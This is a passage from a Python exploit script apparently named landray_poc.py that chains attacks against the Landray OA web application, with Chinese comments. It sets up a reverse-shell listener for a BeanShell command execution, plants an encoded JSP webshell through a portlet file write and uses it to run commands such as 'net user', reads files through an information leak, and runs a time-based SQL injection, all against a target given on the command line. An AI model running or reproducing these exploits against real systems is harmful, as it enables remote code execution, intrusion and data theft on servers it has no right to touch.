        beanshell_res = requests.post(base_url + '/ekp/sys/ui/extend/varkind/custom.jsp', data=data, headers={
            'Content-Type': 'application/x-www-form-urlencoded',
        })

    # ----- beanshell_command_execute() -----
    server_ready_event = threading.Event()
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    beanshell_res = None

    server_thread = threading.Thread(target=beanshell_command_execute_server)
    server_thread.start()
    server_ready_event.wait()
    beanshell_command_execute_reverse_shell()

# portlet JSP 文件写入漏洞
def portlet_jsp_file_write():
    res = requests.get(base_url + '/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=%7b%0a%22%70%61%6e%65%6c%22%3a%22%74%61%62%70%61%6e%65%6c%22%2c%0a%22%70%61%6e%65%6c%54%79%70%65%22%3a%22%68%22%2c%0a%22%6c%61%79%6f%75%74%49%64%22%3a%22%22%2c%0a%22%68%65%69%67%68%74%22%3a%22%31%5c%22%3e%3c%2f%75%69%3a%74%61%62%70%61%6e%65%6c%3e%50%4F%43%3c%75%69%3a%74%61%62%70%61%6e%65%6c%20%68%65%69%67%68%74%3d%5c%22%31%22%2c%0a%22%6c%61%79%6f%75%74%4f%70%74%22%3a%7b%7d%2c%0a%22%70%6f%72%74%6c%65%74%22%3a%5b%5d%0a%7d',
                       allow_redirects=False,
                       headers={
                           'Cookie': cookies
                       })

    if res.status_code == 200 and 'POC' in res.text:
        print('[INFO] portlet JSP 文件写入成功')

        # 若 portlet JSP 文件写入漏洞利用成功，则再次利用执行命令
        portlet_jsp_process_execute()

    elif res.status_code == 302:
        print('[ERROR] portlet JSP 文件写入失败，cookies 不存在或无效')
    else:
        print('[ERROR] portlet JSP 文件写入失败')

# portlet JSP 远程代码执行漏洞
def portlet_jsp_process_execute():
    if os_type == 'linux':
        res = requests.get(base_url + '/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=%7b%0a%22%70%61%6e%65%6c%22%3a%22%74%61%62%70%61%6e%65%6c%22%2c%0a%22%70%61%6e%65%6c%54%79%70%65%22%3a%22%68%22%2c%0a%22%6c%61%79%6f%75%74%49%64%22%3a%22%22%2c%0a%22%68%65%69%67%68%74%22%3a%22%31%5c%22%3e%3c%2f%75%69%3a%74%61%62%70%61%6e%65%6c%3e%3c%25%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%69%5c%22%29%29%3b%25%3e%3c%75%69%3a%74%61%62%70%61%6e%65%6c%20%68%65%69%67%68%74%3d%5c%22%31%22%2c%0a%22%6c%61%79%6f%75%74%4f%70%74%22%3a%7b%7d%2c%0a%22%70%6f%72%74%6c%65%74%22%3a%5b%5d%0a%7d&i=who',
                            headers={
                                'Cookie': cookies
                            })
    elif os_type == 'windows':
        res = requests.get(base_url + '/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=%7b%0a%22%70%61%6e%65%6c%22%3a%22%74%61%62%70%61%6e%65%6c%22%2c%0a%22%70%61%6e%65%6c%54%79%70%65%22%3a%22%68%22%2c%0a%22%6c%61%79%6f%75%74%49%64%22%3a%22%22%2c%0a%22%68%65%69%67%68%74%22%3a%22%31%5c%22%3e%3c%2f%75%69%3a%74%61%62%70%61%6e%65%6c%3e%3c%25%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%69%5c%22%29%29%3b%25%3e%3c%75%69%3a%74%61%62%70%61%6e%65%6c%20%68%65%69%67%68%74%3d%5c%22%31%22%2c%0a%22%6c%61%79%6f%75%74%4f%70%74%22%3a%7b%7d%2c%0a%22%70%6f%72%74%6c%65%74%22%3a%5b%5d%0a%7d&i=net user',
                            headers={
                                'Cookie': cookies
                            })

# updatedFiles.jsp 信息泄露漏洞
def updatedFiles_jsp_file_read():
    res = requests.get(base_url + '/ekp/resource/jsp/updatedFiles.jsp?date=%32%30%31%31%2d%30%31%2d%30%31%20%31%32%3a%31%32%3a%31%32', allow_redirects=False, headers={
        'Host': '10.13.3.76:8080',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37',
        'DNT': '1',
        'Accept': '*/*',
        'Referer': 'http://10.13.3.76:8080/ekp/sys/portal/sys_portal_main/sysPortalMain.do?method=save&fdAnonymous=0&s_css=default&s_seq=1',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'If-Modified-Since': 'Fri, 09 Oct 2024 06:18:33 GMT',
        'Connection': 'close',
    })

    if '/component/bklink/compBklink_quote_view.jsp' in res.text or 'component\\bklink\\compBklink_quote_view.jsp' in res.text:
        print('[INFO] updatedFiles.jsp 文件读取成功')
    else:
        print('[ERROR] updatedFiles.jsp 文件读取失败')

# sysUiExtend 文件上传漏洞
# def sysUiExtend_file_upload():
#     files = {'file': ('poc.zip', open('poc.zip', 'rb'), 'application/zip')}
#     res = requests.post(base_url + '/ekp/sys/ui/sys_ui_extend/sysUiExtend.do?method=upload', files=files, allow_redirects=False, headers={
#         'Cookie': cookies,
#         'Host': '10.13.3.63:8080',
#         'Accept': 'application/json, text/javascript, */*; q=0.01',
#         'X-Requested-With': 'XMLHttpRequest',
#         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37',
#         'Origin': 'http://10.13.3.63:8080',
#         'Referer': 'http://10.13.3.63:8080/ekp/sys/ui/help/lui-ext/upload.jsp',
#         'Accept-Encoding': 'gzip, deflate',
#         'Accept-Language': 'en-US,en;q=0.9',
#     })

#     print(res.text)

# kmImeetingRes.do SQL 注入漏洞
def kmImeetingRes_sql_injection():
    start = time.time()

    res = requests.get(base_url + '/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1 AND (SELECT 7068 FROM (SELECT(SLEEP(5)))LHgg)&ordertype=down&s_ajax=true', allow_redirects=False,
                        headers={
                            'Cookie': cookies
                        })
    
    end = time.time()

    # SQL 注入 sleep 5s
    if res.status_code == 200 and 'test会议' in res.text and end - start > 5.0:
        print('[INFO] kmImeetingRes.do SQL 注入成功')
    elif res.status_code == 302:
        print('[ERROR] kmImeetingRes.do SQL 注入失败，cookies 不存在或无效')
    else:
        print('[ERROR] kmImeetingRes.do SQL 注入失败')

if __name__ == "__main__":
    # 检查蓝凌OA的url参数是否正常
    match = re.match(r'^http://(\d+\.\d+\.\d+\.\d+):(\d+)$', sys.argv[1])
    if len(sys.argv) != 3 or match is None:
        print("Usage: python3 landray_poc.py http://ip:port os_type")
        sys.exit(1)

    # 检查OS参数是否正常
    if sys.argv[2].lower() != 'linux' and sys.argv[2].lower() != 'windows':
        print("Unknown operation system type")
        sys.exit(1)

    base_url = sys.argv[1]
    landray_ip = match.group(1)
    landray_port = int(match.group(2))
    os_type = sys.argv[2]

    # 检查是否能够正常连接蓝凌OA
    if not check_connection(landray_ip, landray_port):
        sys.exit(1)

    treexml_tmpl_command_execute()
    custom_jsp_file_read()
    XmlDecoder_command_execute()
    beanshell_command_execute()
    updatedFiles_jsp_file_read()

    get_cookies()
    debug_jsp_file_write()
    portlet_jsp_file_write()
    kmImeetingRes_sql_injection()